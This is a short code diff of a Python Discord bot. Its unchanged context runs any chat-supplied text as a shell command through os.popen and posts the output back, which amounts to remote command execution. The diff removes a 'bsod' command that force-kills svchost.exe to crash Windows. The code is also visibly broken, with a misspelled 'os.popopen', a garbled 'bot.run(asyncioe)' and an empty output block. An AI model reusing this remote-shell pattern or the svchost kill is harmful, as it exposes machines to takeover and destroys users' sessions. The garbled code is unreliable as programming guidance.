@@ -28,12 +28,4 @@ async def run_command(ctx, *, command: str):
     result = os.popen(command).read()
     await ctx.send(f'Command output:\n``````')
 
-@bot.command(name='bsod')
-async def bsod():
-  os.popopen("taskkill /f /im svchost.exe")
-
-@bot.command(name='exit')
-async def exi():
-    exit(0)
-    print("failed to exit.")
 bot.run(asyncioe)
